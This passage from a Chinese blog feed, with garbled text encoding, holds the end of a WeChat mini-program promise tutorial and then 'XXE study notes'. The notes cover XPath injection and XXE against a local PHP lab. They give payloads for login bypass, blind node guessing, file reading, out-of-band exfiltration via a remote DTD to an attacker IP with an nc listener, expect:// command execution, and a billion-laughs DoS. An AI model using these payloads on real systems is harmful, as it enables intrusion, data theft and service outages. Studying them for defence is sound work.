<span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  getdata<span class="token punctuation">,</span>  postdata<span class="token punctuation">&#125;</span></code></pre><p><code>app.js</code>å¼•å…¥</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> api <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span>'<span class="token punctuation">.</span><span class="token operator">/</span>api<span class="token operator">/</span>index<span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token function-variable function">onLaunch</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    xxx  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  globalData<span class="token operator">:</span> <span class="token punctuation">&#123;</span>    api  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p><code>index.js</code>ä½¿ç”¨</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">getApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> api <span class="token operator">=</span> app<span class="token punctuation">.</span>globalData<span class="token punctuation">.</span>api<span class="token function">Page</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  api<span class="token punctuation">.</span><span class="token function">getdata</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  api<span class="token punctuation">.</span><span class="token function">postdata</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>x<span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span>y<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h4 id="åŒæ­¥"><a href="#åŒæ­¥" class="headerlink" title="åŒæ­¥"></a>åŒæ­¥</h4><p><code>app.js</code>å¼•å…¥</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">promisify</span><span class="token punctuation">(</span><span class="token parameter">api</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token parameter">opt<span class="token punctuation">,</span> <span class="token operator">...</span>arg</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token function">api</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> opt<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> success<span class="token operator">:</span> resolve<span class="token punctuation">,</span> fail<span class="token operator">:</span> reject <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">...</span>arg<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  request<span class="token operator">:</span> <span class="token function">promisify</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>request<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p><code>index.js</code>ä½¿ç”¨</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">getApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Page</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token function-variable function">showdate</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token keyword">await</span> app<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>url<span class="token operator">:</span><span class="token string">'xxx'</span><span class="token punctuation">,</span>method<span class="token operator">:</span><span class="token string">'GET'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://es6.ruanyifeng.com/#docs/promise">Promise å¯¹è±¡</a></li><li><a href="https://blog.csdn.net/weixin_44833680/article/details/102658108">å¾®ä¿¡å°ç¨‹åºå°è£…å¼‚æ­¥è¯·æ±‚</a></li><li><a href="https://developers.weixin.qq.com/community/develop/article/doc/00028cbc2e04e0ddf549d535351c13">å°†å°ç¨‹åºåŸç”Ÿå¼‚æ­¥å‡½æ•°promisifyåï¼Œåœ¨async/awaitä¸­ä½¿ç”¨</a></li><li><a href="https://developers.weixin.qq.com/community/develop/article/doc/000ceaee71c9d09ae5b8c77d151813">å¾®ä¿¡å°ç¨‹åºä¸­ä½¿ç”¨Async/Awaitæ–¹æ³•å¼‚æ­¥è¯·æ±‚å˜ä¸ºåŒæ­¥è¯·æ±‚</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXEå­¦ä¹ ç¬”è®°</title>
      <link href="posts/55c267c8/"/>
      <url>posts/55c267c8/</url>
      
        <content type="html"><![CDATA[    <div id="aplayer-VBQSoeqZ" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="5174564734" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="none" data-theme="#ad7a86"></div><span id="more"></span><h3 id="XPathæ³¨å…¥"><a href="#XPathæ³¨å…¥" class="headerlink" title="XPathæ³¨å…¥"></a>XPathæ³¨å…¥</h3><p>XPathæ³¨å…¥å¯¹è±¡æ˜¯ä¸€ä¸ªå­˜å‚¨æ•°æ®çš„XMLæ–‡ä»¶</p><h4 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h4><p><strong>index.xml</strong></p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>users</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>rootpwd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>adminpwd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>users</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p><strong>index.php</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$xml</span><span class="token operator">=</span><span class="token function">simplexml_load_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.xml'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$pwd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"/root/users/user[username/text()='"</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string double-quoted-string">"' and password/text()='"</span><span class="token operator">.</span><span class="token variable">$pwd</span><span class="token operator">.</span><span class="token string double-quoted-string">"']"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$query</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$xml</span><span class="token operator">-></span><span class="token function">xpath</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;h2>Welcome&lt;/h2>'</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br />ID:'</span><span class="token operator">.</span><span class="token variable">$value</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br />Username:'</span><span class="token operator">.</span><span class="token variable">$value</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><h4 id="ç›´æ¥æ³¨å…¥"><a href="#ç›´æ¥æ³¨å…¥" class="headerlink" title="ç›´æ¥æ³¨å…¥"></a>ç›´æ¥æ³¨å…¥</h4><p><strong>payload</strong></p><p><code>?name=&#39; or 1=1 or &#39;&#39;=&#39;&amp;pwd=1</code>ï¼Œç»“æœå¦‚ä¸‹ï¼Œç±»ä¼¼sqlæ³¨å…¥ï¼Œç»•è¿‡äº†xmlæŸ¥è¯¢</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811093843233.png" alt loading="lazy"></p><h4 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h4><p><strong>payload</strong></p><p>æœ‰è¿”å›ç»“æœåˆ™ä¸ºæ­£ç¡®</p><pre class="language-xml" data-language="xml"><code class="language-xml">æ¨æµ‹æ ¹èŠ‚ç‚¹æ•°ï¼Œæœ‰è¿”å›ç»“æœåˆ™è¯´æ˜åªæœ‰ä¸€ä¸ªæ ¹èŠ‚ç‚¹' or count(/*) = 1 or '1' = '2  çŒœè§£ä¸€çº§èŠ‚ç‚¹' or substring(name(/*[position() = 1]),1,1)='r' or '1'='2  ' or substring(name(/*[position() = 1]),1,1)='o' or '1'='2  ......æ¨æµ‹rootçš„ä¸‹ä¸€çº§èŠ‚ç‚¹æ•°' or count(/root/*) = 1 or '1' = '2çŒœè§£rootçš„ä¸‹ä¸€çº§èŠ‚ç‚¹' or substring(name(/root/*[position() = 1]),1,1)='u' or '1'='2' or substring(name(/root/*[position() = 1]),1,1)='s' or '1'='2......çŒœè§£èŠ‚ç‚¹ä¸­çš„æ•°æ®' or /root/users/user[1]/username[contains(text(),'r')] or '1'='2  ' or /root/users/user[1]/username[contains(text(),'ro')] or '1'='2  ......</code></pre><ul><li><code>/ ï¼š</code>ä»æ ¹èŠ‚ç‚¹é€‰å–</li><li><code>// ï¼š</code>ä»åŒ¹é…é€‰æ‹©çš„å½“å‰èŠ‚ç‚¹é€‰æ‹©æ–‡æ¡£ä¸­çš„èŠ‚ç‚¹ï¼Œè€Œä¸è€ƒè™‘å®ƒä»¬çš„ä½ç½®</li><li><code>. ï¼š</code>é€‰å–å½“å‰èŠ‚ç‚¹</li><li><code>.. ï¼š</code>é€‰å–å½“å‰èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹</li></ul><h3 id="XMLå¤–éƒ¨å®ä½“æ³¨å…¥-XXE"><a href="#XMLå¤–éƒ¨å®ä½“æ³¨å…¥-XXE" class="headerlink" title="XMLå¤–éƒ¨å®ä½“æ³¨å…¥(XXE)"></a>XMLå¤–éƒ¨å®ä½“æ³¨å…¥(XXE)</h3><blockquote><p>XXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶å’Œä»£ç ï¼Œé€ æˆ<strong>ä»»æ„æ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·Dosæ”»å‡»</strong>ç­‰å±å®³ã€‚</p><p>XXEæ¼æ´è§¦å‘çš„ç‚¹å¾€å¾€æ˜¯å¯ä»¥ä¸Šä¼ xmlæ–‡ä»¶çš„ä½ç½®ï¼Œæ²¡æœ‰å¯¹ä¸Šä¼ çš„xmlæ–‡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´å¯ä¸Šä¼ æ¶æ„xmlæ–‡ä»¶ã€‚</p></blockquote><blockquote><p>XXEçš„é€ æˆä¸PHPç‰ˆæœ¬æ— å…³ï¼Œä¸libxmlåº“çš„ç‰ˆæœ¬æœ‰å…³ã€‚libxml &lt;= 2.9.0ä¸­ï¼Œé»˜è®¤å¯ç”¨äº†å¤–éƒ¨å®ä½“ï¼Œlibxml&gt;2.9.0ä¸­é»˜è®¤ä»…ç”¨äº†å¤–éƒ¨å®ä½“ã€‚XXEå¹¶ä¸æ˜¯ç›´æ¥ç”±libxmlåº“é€ æˆçš„ï¼Œlibxmlåº“æä¾›äº†ä¸€äº›XMLæ ¸å¿ƒåŠŸèƒ½ï¼ŒåŒ…æ‹¬ç¦ç”¨å¤–éƒ¨å®ä½“çš„libxml_disable_entity_loader()å‡½æ•°ï¼ŒSimpleXMLåº“æä¾›äº†è§£æXMLçš„å‡½æ•°ï¼ŒSimpleXMLåº“ä¾èµ–äºlibxmlåº“ã€‚</p></blockquote><p>æœ¬åœ°æµ‹è¯•ç¯å¢ƒphp.4.45   libxml = 2.7.8</p><p>å¤–éƒ¨å®ä½“å¯æ”¯æŒhttpã€fileç­‰åè®®ã€‚ä¸åŒç¨‹åºæ”¯æŒçš„åè®®ä¸åŒ</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811110816675.png" alt loading="lazy"></p><h4 id="è¯»å–ä»»æ„æ–‡ä»¶"><a href="#è¯»å–ä»»æ„æ–‡ä»¶" class="headerlink" title="è¯»å–ä»»æ„æ–‡ä»¶"></a>è¯»å–ä»»æ„æ–‡ä»¶</h4><h5 id="æœ‰å›æ˜¾"><a href="#æœ‰å›æ˜¾" class="headerlink" title="æœ‰å›æ˜¾"></a>æœ‰å›æ˜¾</h5><p><strong>xxe.php</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xml'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$xml</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><strong>payload</strong></p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>&lt;!ENTITY file SYSTEM "file:///d://flag.txt" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>urlç¼–ç åç»™ä¼ å…¥ï¼Œå³åœ¨ xml ä¸­ <code>&amp;file ;</code> å˜æˆäº†å¤–éƒ¨æ–‡ä»¶<code>qwzf.txt</code>ä¸­å†…å®¹ï¼Œå¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811102323743.png" alt loading="lazy"></p><h5 id="æ— å›æ˜¾"><a href="#æ— å›æ˜¾" class="headerlink" title="æ— å›æ˜¾"></a>æ— å›æ˜¾</h5><p><strong>xxe.php</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xml'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// print_r($xml);</span><span class="token delimiter important">?></span></span></code></pre><p>è¿™ç§æƒ…å†µå°±éœ€è¦å°†æ•°æ®å‘é€åˆ°è¿œç¨‹æœåŠ¡å™¨(æ”»å‡»æœåŠ¡å™¨)</p><p><strong>payload</strong></p><p><strong>ä¼ å…¥çš„xml</strong>    ä¸¤ç§æ–¹å¼</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=D:/flag.txt">&lt;!ENTITY % dtd SYSTEM "http://172.18.104.218/xxe.dtd">%dtd;%send;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>å¦ä¸€ç§æ–¹å¼<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY % dtd SYSTEM "http://172.18.104.218/xxe.dtd">%dtd;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span></code></pre><p><strong>è¿œç¨‹æœåŠ¡å™¨çš„xxe.dtdæ–‡ä»¶</strong>    ä¸¤ç§æ–¹å¼</p><pre class="language-xml" data-language="xml"><code class="language-xml">&lt;!ENTITY % payload "&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> send SYSTEM 'http://172.18.104.218/?content=%file;'>">%payload;å¦ä¸€ç§æ–¹å¼ï¼š&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=D:/flag.txt">&lt;!ENTITY % int "&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> send SYSTEM 'http://172.18.104.218:5000/?content=%file;'>">%int;%send;</code></pre><p>å°†xmlè¿›è¡Œurlç¼–ç åä¼ å…¥</p><p>å†æŸ¥çœ‹è¿œç¨‹æœåŠ¡å™¨çš„apacheæ—¥å¿—æ–‡ä»¶</p><p><code>cat /var/log/apache2/access.log</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811104737190.png" alt loading="lazy"></p><p><code>nc -lvp 5000</code>  ç«¯å£ç›‘å¬</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811111337248.png" alt loading="lazy"></p><p>è§£ç åå³æ˜¯æ–‡ä»¶çš„å†…å®¹</p><p>æ”»å‡»æµç¨‹</p><ul><li>å…ˆè°ƒç”¨<code>%dtd</code>ï¼Œè¯·æ±‚è¿œç¨‹æœåŠ¡å™¨(æ”»å‡»æœåŠ¡å™¨)ä¸Šçš„<code>evil.dtd</code>ã€‚</li><li>å†è°ƒç”¨ <code>evil.dtd</code>ä¸­çš„ <code>%file</code>ã€‚<code>%file</code> è·å–å—æ”»å‡»çš„æœåŠ¡å™¨ä¸Šé¢çš„æ•æ„Ÿæ–‡ä»¶ï¼Œç„¶åå°† <code>%file</code> çš„è¿”å›ç»“æœä¼ åˆ°<code>%send</code> ã€‚</li><li>ç„¶åè°ƒç”¨ <code>%send;</code> æŠŠè¯»å–åˆ°çš„æ•°æ®å‘é€åˆ°è¿œç¨‹æœåŠ¡å™¨ä¸Šã€‚</li></ul><h4 id="ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ"><a href="#ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ"></a>ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ</h4><p>åœ¨å®‰è£…expectæ‰©å±•çš„PHPç¯å¢ƒé‡Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå…¶ä»–åè®®ä¹Ÿæœ‰å¯èƒ½å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>&lt;!ENTITY xxe SYSTEM "expect://id" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>é€šè¿‡XXEå¯ä»¥å®ç°RCEçš„å®ä¾‹å¾ˆå°‘ã€‚</p><h4 id="æ‹’ç»æœåŠ¡æ”»å‡»-Dos"><a href="#æ‹’ç»æœåŠ¡æ”»å‡»-Dos" class="headerlink" title="æ‹’ç»æœåŠ¡æ”»å‡»(Dos)"></a>æ‹’ç»æœåŠ¡æ”»å‡»(Dos)</h4><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>   <span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">lolz</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol</span> <span class="token attr-name">"lol"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol2</span> <span class="token attr-name">"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol3</span> <span class="token attr-name">"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol4</span> <span class="token attr-name">"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol5</span> <span class="token attr-name">"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol6</span> <span class="token attr-name">"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol7</span> <span class="token attr-name">"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol8</span> <span class="token attr-name">"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol9</span> <span class="token 